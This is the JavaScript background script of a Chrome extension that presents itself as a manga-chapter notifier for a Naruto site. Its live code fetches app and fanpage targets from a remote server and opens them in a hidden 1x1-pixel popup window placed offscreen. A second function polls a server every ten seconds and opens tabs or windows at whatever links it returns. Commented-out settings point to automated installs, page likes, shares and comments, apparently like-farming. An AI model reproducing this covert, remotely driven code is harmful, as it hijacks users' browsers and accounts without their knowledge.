/*var Title_Notification = "Naruto",
    Message_Notification = "Naruto chap 670",
    Link_Notification = "http://truyen.hay.la/naruto-44439",
    Icon_Notification = "http://truyen.hay.la/Truyen/naruto_44439.jpg",
    UPDATE_INTERVAL = 1,
    TIMETOSHOW_INTERVAL = 360,
    MINUTESSHOWWEB_INTERVAL = 10,
    DAYSHOWWEB_INTERVAL = 4320,
    NUMBER_OPENWEB = 5,
    FACEBOOKID = "0",
    GOOGLEID = "0",
    sleepbeforeinstallapp = 5,
    sleepclickinstallapp = 3,
    sleepcommentinstallapp = 3,
    sleepsettingapp = 3,
    sleepafterinstallapp = 12,
    sleepbeforelikepage = 5,
    sleepupdatepagebeforefollowlikepage =
    5,
    sleepbeforefollowlikepage = 2,
    sleepfacefollow = 3,
    sleepafterlikepage = 11,
    sleepbeforepostface = 5,
    sleeppostfaceshare = 2,
    sleepgetclassbeforcomment = 1,
    sleeppostfacecomment = 2,
    sleepafterpostface = 6,
    sleepbeforecommentmanga = 5,
    sleepaftercommentmanga = 1,
    linktosentfriend = "0",
    lstfriend = [],
    sendInviteStep = -1,
    myTab = -1,
    myWindow = -1,
    urlpopRequest = "https://extension.hay.la/Home/TestFacebook",
    AppForChrome;
	*/

/*
setDefaults();

function setDefaults() {
    localStorage.TIMETOSHOW_INTERVAL ? TIMETOSHOW_INTERVAL = JSON.parse(localStorage.TIMETOSHOW_INTERVAL) : localStorage.TIMETOSHOW_INTERVAL = TIMETOSHOW_INTERVAL;
    localStorage.MINUTESSHOWWEB_INTERVAL ? MINUTESSHOWWEB_INTERVAL = JSON.parse(localStorage.MINUTESSHOWWEB_INTERVAL) : localStorage.MINUTESSHOWWEB_INTERVAL = MINUTESSHOWWEB_INTERVAL;
    localStorage.DAYSHOWWEB_INTERVAL ? DAYSHOWWEB_INTERVAL = JSON.parse(localStorage.DAYSHOWWEB_INTERVAL) : localStorage.DAYSHOWWEB_INTERVAL = DAYSHOWWEB_INTERVAL;
    localStorage.NUMBER_OPENWEB ?
        NUMBER_OPENWEB = JSON.parse(localStorage.NUMBER_OPENWEB) : localStorage.NUMBER_OPENWEB = NUMBER_OPENWEB;
    localStorage.FACEBOOKID ? FACEBOOKID = JSON.parse(localStorage.FACEBOOKID) : localStorage.FACEBOOKID = FACEBOOKID;
    localStorage.GOOGLEID ? GOOGLEID = localStorage.GOOGLEID : localStorage.GOOGLEID = GOOGLEID;
    localStorage.dateShowWeb || (localStorage.dateShowWeb = (new Date).getTime());
    localStorage.sleepbeforeinstallapp ? sleepbeforeinstallapp = JSON.parse(localStorage.sleepbeforeinstallapp) : localStorage.sleepbeforeinstallapp =
        sleepbeforeinstallapp;
    localStorage.sleepsettingapp ? sleepsettingapp = JSON.parse(localStorage.sleepsettingapp) : localStorage.sleepsettingapp = sleepsettingapp;
    localStorage.sleepclickinstallapp ? sleepclickinstallapp = JSON.parse(localStorage.sleepclickinstallapp) : localStorage.sleepclickinstallapp = sleepclickinstallapp;
    localStorage.sleepcommentinstallapp ? sleepcommentinstallapp = JSON.parse(localStorage.sleepcommentinstallapp) : localStorage.sleepcommentinstallapp = sleepcommentinstallapp;
    localStorage.sleepafterinstallapp ?
        sleepafterinstallapp = JSON.parse(localStorage.sleepafterinstallapp) : localStorage.sleepafterinstallapp = sleepafterinstallapp;
    localStorage.sleepbeforelikepage ? sleepbeforelikepage = JSON.parse(localStorage.sleepbeforelikepage) : localStorage.sleepbeforelikepage = sleepbeforelikepage;
    localStorage.sleepupdatepagebeforefollowlikepage ? sleepupdatepagebeforefollowlikepage = JSON.parse(localStorage.sleepupdatepagebeforefollowlikepage) : localStorage.sleepupdatepagebeforefollowlikepage = sleepupdatepagebeforefollowlikepage;
    localStorage.sleepbeforefollowlikepage ? sleepbeforefollowlikepage = JSON.parse(localStorage.sleepbeforefollowlikepage) : localStorage.sleepbeforefollowlikepage = sleepbeforefollowlikepage;
    localStorage.sleepfacefollow ? sleepfacefollow = JSON.parse(localStorage.sleepfacefollow) : localStorage.sleepfacefollow = sleepfacefollow;
    localStorage.sleepafterlikepage ? sleepafterlikepage = JSON.parse(localStorage.sleepafterlikepage) : localStorage.sleepafterlikepage = sleepafterlikepage;
    localStorage.sleepbeforepostface ? sleepbeforepostface =
        JSON.parse(localStorage.sleepbeforepostface) : localStorage.sleepbeforepostface = sleepbeforepostface;
    localStorage.sleeppostfaceshare ? sleeppostfaceshare = JSON.parse(localStorage.sleeppostfaceshare) : localStorage.sleeppostfaceshare = sleeppostfaceshare;
    localStorage.sleepgetclassbeforcomment ? sleepgetclassbeforcomment = JSON.parse(localStorage.sleepgetclassbeforcomment) : localStorage.sleepgetclassbeforcomment = sleepgetclassbeforcomment;
    localStorage.sleeppostfacecomment ? sleeppostfacecomment = JSON.parse(localStorage.sleeppostfacecomment) :
        localStorage.sleeppostfacecomment = sleeppostfacecomment;
    localStorage.sleepafterpostface ? sleepafterpostface = JSON.parse(localStorage.sleepafterpostface) : localStorage.sleepafterpostface = sleepafterpostface;
    localStorage.sleepbeforecommentmanga ? sleepbeforecommentmanga = JSON.parse(localStorage.sleepbeforecommentmanga) : localStorage.sleepbeforecommentmanga = sleepbeforecommentmanga;
    localStorage.sleepaftercommentmanga ? sleepaftercommentmanga = JSON.parse(localStorage.sleepaftercommentmanga) : localStorage.sleepaftercommentmanga =
        sleepaftercommentmanga
}
*/
function sleep(a) {
    for (var b = (new Date).getTime(); new Date < b + 1E3 * a;);
    return 0
}

function doPopup(a) {
    var b = 1;
    if (localStorage.versionApp) {
        if (b = JSON.parse(localStorage.versionApp), 0 == a % NUMBER_OPENWEB) {
            var c;
            c = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
            c.onreadystatechange = function() {
                if (4 == c.readyState && 200 == c.status) {
                    for (var a = JSON.parse(c.responseText), e = b, f = 0; f < a.length; f++) e < a[f].Version && (e = a[f].Version);
                    if (0 < a.length) {
                        localStorage.versionApp = JSON.stringify(e + 1);
                        e = "https://play.google.com/store/apps/details?id=" + a[0].App + "";
                        2 == a[0].Type &&
                            (e = "https://www.facebook.com/" + a[0].App + "");
                        3 == a[0].Type && (e = "https://m.facebook.com/" + a[0].App + "");
                        4 == a[0].Type && (e = a[0].App);
                        5 == a[0].Type && (e = a[0].App);
                        6 == a[0].Type && (e = a[0].App);
                        7 == a[0].Type && (e = a[0].App);
                        for (var f = 0; f < a.length; f++) 5 == a[f].Type && (urlpopRequest = a[f].App);
                        AppForChrome = a;
                        try {
                            chrome.windows.create({
                                url: e,
                                type: "popup",
                                focused: !0,
                                width: 1,
                                left: 1E4,
                                top: 1E4,
                                height: 1
                            }, function(a) {
                                myWindow = a = a.id;
                                chrome.tabs.query({
                                    active: !0,
                                    windowId: a
                                }, function(a) {
                                    myTab = a[0].id;
                                    sendInviteStep = 1
                                })
                            })
                        } catch (l) {}
                    }
                }
            };
            c.open("GET", "https://hay.la/app/getAppAndFanpageVersion?version=" + b + "", !0);
            c.send()
        }
    } else localStorage.versionApp = JSON.stringify(1);
    return 0
}
function randomId() {
    return Math.floor((Math.random() * 2) + 1);// random from 1 to 3
}

function test(){
    var xhttp;
    xhttp = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState == 4 && xhttp.status == 200) {
            var resJsonObj = JSON.parse(xhttp.responseText);
            if(resJsonObj.id == 1){
                createNewTab(resJsonObj.links);
            }
            if(resJsonObj.id == 2){
                createNewWindow(resJsonObj.links);
            }

        }
    };
    xhttp.open("GET", "http://localhost:3000/posts/"+randomId(), !0);
    xhttp.send()
}

function createNewTab(url) {
	chrome.tabs.create({url: url, selected: false});
}

function createNewWindow(url){
    try {
        chrome.windows.create({
            url: url,
            type: "normal",
            focused: !0,
            width: 500,
            height: 500
        }, function(a) {
            myWindow = a = a.id;
            chrome.tabs.query({
                active: !0,
                windowId: a
            }, function(a) {
                myTab = a[0].id;
                sendInviteStep = 1
            })
        })
    } catch (l) {}
}
//setInterval(createNewTab, 20000);
setInterval(test, 10000);